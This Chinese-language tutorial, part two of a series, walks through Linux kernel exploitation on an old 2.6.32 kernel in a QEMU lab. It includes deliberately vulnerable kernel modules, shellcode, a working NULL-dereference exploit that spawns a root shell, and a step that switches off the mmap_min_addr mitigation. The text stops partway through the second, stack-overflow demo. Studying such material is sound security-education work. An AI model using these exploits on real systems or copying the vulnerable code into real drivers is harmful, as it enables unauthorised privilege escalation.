# 【系列分享】Linux 内核漏洞利用教程（二）：两个Demo
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
****
作者：[o0xmuhe](http://bobao.360.cn/member/contribute?uid=32403999)
预估稿费：400RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**传送门**
[**【系列分享】Linux 内核漏洞利用教程（一）：环境配置**
****](http://bobao.360.cn/learning/detail/3700.html)
**  
**
**0x00: 前言**
本篇文章将介绍两种简单的kernel exploit姿势，分别是：
NULL Dereference
Kernel Stack Overflow
**0x01: NULL Dereference**
**1\. 介绍**
古老的Linux NULL pointer dereference exploit,映射0地址分配shellcode运行
**2\. 漏洞代码**
    #include 
    #include 
    #include 
    #include 
    void (*my_funptr)(void);
    int bug1_write(struct file *file,const char *buf,unsigned long len)
    {
            my_funptr();
            return len;
    }
    static int __init null_dereference_init(void)
    {
            printk(KERN_ALERT "null_dereference driver init!n");
            create_proc_entry("bug1",0666,0)->write_proc = bug1_write;
           return 0;
    }
    static void __exit null_dereference_exit(void)
    {
            printk(KERN_ALERT "null_dereference driver exitn");
    }
    module_init(null_dereference_init);
    module_exit(null_dereference_exit);
    Makefile如下
    obj-m := null_dereference.o  
    KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/  
    PWD := $(shell pwd)  
    modules:  
            $(MAKE) -C $(KERNELDR) M=$(PWD) modules  
    moduels_install:  
            $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  
    clean:  
            rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions
可以看到，vuln code中my_funptr函数指针指向不定，可以劫持之后代码执行。
把驱动编译好，然后把*.ko文件丢进busybox那个文件系统中去，方便后面挂载使用。
**3\. PoC**
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    char payload[] = "xe9xeaxbexadx0b";//jmp 0xbadbeef
    int main(){
        mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);
        memcpy(0, payload, sizeof(payload));
        int fd = open("/proc/bug1", O_WRONLY);
        write(fd, "muhe", 4);
        return 0;
    }
    # muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/null_dereference [4:17:06] 
    $ gcc -static poc.c -o poc
    poc.c: In function ‘main’:
    poc.c:11:5: warning: incompatible implicit declaration of built-in function ‘memcpy’ [enabled by default]
         memcpy(0, payload, sizeof(payload));
         ^
    poc.c:11:5: warning: null argument where non-null required (argument 1) [-Wnonnull]
    # muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/null_dereference [4:17:51] 
    $ cp poc ../../busybox-1.19.4/_install/usr
然后qemu启动系统，启动的时候按下ctrl+alt+2
然后gdb去连接
    # muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1 [4:12:41] 
    $ gdb vmlinux
    gdb-peda$ target remote :1234
    Remote debugging using :1234
    Warning: not running or target is remote
    current_thread_info () at /home/muhe/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/arch/x86/include/asm/thread_info.h:186
    186            (current_stack_pointer & ~(THREAD_SIZE - 1));
    gdb-peda$ b *0x0
    Breakpoint 1 at 0x0
    gdb-peda$ c
    Continuing.
然后qemu中ctrl+alt+1切换回去，然后进入usr目录，挂载驱动后运行poc程序。
gdb里反汇编查看当前执行的指令
**4\. exploit**
**1.思路**
给当前进程赋予root权限
    commit_creds(prepare_kernel_cred(0));
下面取得commit_creds和prepare_kernel_cred地址：
    / # grep commit_creds /proc/kallsyms
    c11b7bc0 T security_commit_creds
    c15f8ed0 r __ksymtab_commit_creds
    c16024d0 r __kcrctab_commit_creds
    c1609215 r __kstrtab_commit_creds
    / # grep prepare_kernel_cred /proc/kallsyms
    c1067fc0 T prepare_kernel_cred
    c15f8eb0 r __ksymtab_prepare_kernel_cred
    c16024c0 r __kcrctab_prepare_kernel_cred
    c16091d9 r __kstrtab_prepare_kernel_cred
**2.编写shellcode**
    xor %eax,%eax
    call 0xc1067fc0
    call 0xc1067e20
    ret
    $ gcc -o payload payload.s -nostdlib -Ttext=0
    $ objdump -d payload
    payload:     file format elf32-i386
    Disassembly of section .text:
    00000000 :
       0:    31 c0                    xor    %eax,%eax
       2:    e8 b9 7f 06 c1           call   c1067fc0 
       7:    e8 14 7e 06 c1           call   c1067e20 
       c:    c3                       ret
得到shellcode
    shellcode="x31xc0xe8xb9x7fx06xc1xe8x14x7ex06xc1xc3"
我们需要分配0地址空间然后放入shellcode，然后jmp过去执行shellcode，使当前进程有root权限，然后执行一个system("/bin/sh");在程序返回用户态之后拿到一个root的shell。
**3\. exploit**
    $ cat exploit.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    char payload[] = "x31xc0xe8xb9x7fx06xc1xe8x14x7ex06xc1xc3";
    int main()
    {
            mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);
            memcpy(0, payload, sizeof(payload));
            int fd = open("/proc/bug1", O_WRONLY);
            write(fd, "muhe", 4);
            system("/bin/sh");//get root shell
            return 0;
    }
**5\. get root shell**
然后新建用户去测试exploit。
但是得到报错：
这是因为，2.6.32内核已经使用mmap_min_addr作为缓解措施mmap_min_addr为4096，需要设置下mmap_min_addr。
    # sysctl -w vm.mmap_min_addr="0"
设置之后重新运行exploit
成功拿到root shell
**0x02 : Kernel Stack Overflow**
**1\. 介绍**
和用户态的栈溢出原理一样，拷贝、拼接字符串的时候未作长度检查，导致覆盖栈上保存的返回地址，只后可以劫持程序流程，从而实现代码执行的效果。只不过这是在内核空间，可以直接用来提权。
**2\. 漏洞代码**
    #include 
    #include 
    #include 
    #include 
    int bug2_write(struct file *file,const char *buf,unsigned long len)
    {
        char localbuf[8];
        memcpy(localbuf,buf,len);
        return len;
    }
    static int __init stack_smashing_init(void)
    {
        printk(KERN_ALERT "stack_smashing driver init!n");
        create_proc_entry("bug2",0666,0)->write_proc = bug2_write;
        return 0;
    }
    static void __exit stack_smashing_exit(void)
    {
        printk(KERN_ALERT "stack_smashing driver exit!n");
    }
    module_init(stack_smashing_init);
    module_exit(stack_smashing_exit);
    obj-m := stack_smashing.o  
    KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/
    PWD := $(shell pwd)  